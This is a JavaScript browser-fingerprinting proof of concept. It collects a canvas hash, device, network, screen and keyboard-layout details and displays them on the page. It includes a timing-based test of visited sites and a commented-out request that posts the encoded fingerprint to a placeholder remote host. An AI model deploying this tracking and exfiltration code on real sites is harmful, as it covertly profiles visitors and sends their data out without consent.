const canvasFingerprint = () => {
  const bin2hex = a => {
    var b, c, d = "", e;
    a += "";
    b = 0;

    for(c = a.length; b < c; b++) {
      e = a.charCodeAt(b).toString(16);
      d += 2 > e.length ? "0" + e : e;
    }

    return d
  }

  const drawCanvas = () => {
    const canvas = document.createElement("canvas");
    canvas.setAttribute("width",220);
    canvas.setAttribute("height",30);
    const ctx = canvas.getContext("2d");
    ctx.textBaseline="top";
    ctx.font="14px 'Arial'";
    ctx.textBaseline="alphabetic";
    ctx.fillStyle="#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle="#069";
    ctx.fillText("sm", 2, 15);
    ctx.fillStyle="rgba(102, 204, 0, 0.7)";
    ctx.fillText("sm", 4, 17);
    return bin2hex(atob(canvas.toDataURL("image/png").replace("data:image/png;base64,","")).slice(-16, -12));
  }

  return drawCanvas();
}

const getLocalStorage = () => {
  if ("localStorage" in window && window["localStorage"] !== null) {
    return window["localStorage"];
  } else {
    return "localStorage_is_void";
  }
}

const listHardware = async () => {
  return new Promise( async (resolve, reject) => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
      resolve("media_devices_not_supported");
    }
    const res = await navigator.mediaDevices.enumerateDevices();
    resolve(res);
  });
}

const networkInfo = () => {
  try {
    const aux = navigator.connection;
    return {
      downlink: `${aux.downlink} mb/s`,
      band: aux.effectiveType,
      rtt: `${aux.rtt} ms`,
      browserSaveDataModeOn: aux.saveData,
      connectionTech: aux.type,
    };
  } catch(err) {
    return {};
  }
}

// https://wicg.github.io/keyboard-map/#h-keyboard-getlayoutmap
const getWritingSystemKeys = () => {
  return new Promise(async (resolve) => {
    try {
      const keys = [
        'Backquote',
        'Backslash',
        'Backspace',
        'BracketLeft',
        'BracketRight',
        'Comma',
        'Digit0',
        'Digit1',
        'Digit2',
        'Digit3',
        'Digit4',
        'Digit5',
        'Digit6',
        'Digit7',
        'Digit8',
        'Digit9',
        'Equal',
        'IntlBackslash',
        'IntlRo',
        'IntlYen',
        'KeyA',
        'KeyB',
        'KeyC',
        'KeyD',
        'KeyE',
        'KeyF',
        'KeyG',
        'KeyH',
        'KeyI',
        'KeyJ',
        'KeyK',
        'KeyL',
        'KeyM',
        'KeyN',
        'KeyO',
        'KeyP',
        'KeyQ',
        'KeyR',
        'KeyS',
        'KeyT',
        'KeyU',
        'KeyV',
        'KeyW',
        'KeyX',
        'KeyY',
        'KeyZ',
        'Minus',
        'Period',
        'Quote',
        'Semicolon',
        'Slash'
      ];

      if (!('keyboard' in navigator)) {
         return resolve()
      }

      const keyoardLayoutMap = await navigator.keyboard.getLayoutMap()
      const writingSystemKeys = keys.map(key => {
      const value = keyoardLayoutMap.get(key)
        return {
          [key]: value
        }
      });

      return resolve(writingSystemKeys)

    } catch (error) {
      return resolve()
    }
  });

}

const testVisited = (urls) => {
  return new Promise( (resolve, reject) => {
    let results = [];
    for (let i in urls) {
      const img = new Image();
      const time = new Date();
      img.src = urls[i];
      img.onload = () => {
        results.push([ urls[i], (new Date() - time) > 50 /*ms*/ ? false : true]);
      }
    }

    setTimeout( () => resolve(results), urls.length * 520);
  });
}

const urls = [
  "https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_160x56dp.png",
  "https://foro.elhacker.net/Themes/converted/selogo.jpg",
  "https://example.com",
  "https://wikipedia.org/static/images/mobile/copyright/wikipedia-wordmark-en.svg",
  "https://github.com/fluidicon.png"
];

const getInfo = async () => {
  const fp = {};
  fp.currentUrl = window.location;
  fp.canvasFingerprint = canvasFingerprint();
  fp.userAgent = navigator.userAgent;
  fp.appVersion = navigator.appVersion;
  fp.platforn= navigator.platform;
  fp.date = new Date();
  try {
  fp.localStorage = getLocalStorage();
  } catch(err) {

  }
  fp.hardware = await listHardware();
  fp.dimensions = {
    outerWidth: window.outerWidth,
    outerHeight: window.outerHeight,
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight
  };
  fp.networkInfo = networkInfo();
  fp.logicalCpuCores = navigator.hardwareConcurrency;
  //TODO: fp.geoloc = ...
  //TODO: fp.printAsText = () => `  `;
  fp.javaEnabled = navigator.javaEnabled();
  fp.language = navigator.language;
  fp.pixelRatio = window.devicePixelRatio;
  fp.systemKeys = await getWritingSystemKeys();
  // fp.visited = await testVisited(urls);

  return fp;
}


(async () => {
  try {
    const res = await getInfo();
    Object.keys(res).forEach( (prop) => document.body.innerText += prop + ":\n" + JSON.stringify(res[prop], null, 2) + "\n\n\n");
  } catch(err) {
    alert(err);
  }
/*
  try {
    const _ = await fetch(`http://123.456.789:9055/fingerprint`, {
      method: "post",
      body: `fp=${btoa(unescape(encodeURIComponent(res)))}`,
      headers: {
        "content-type": "application/x-www-form-urlencoded"
      }
    });
  } catch(err) {
    //alert(err)
  }
*/
  // alert("request send");
//
})();
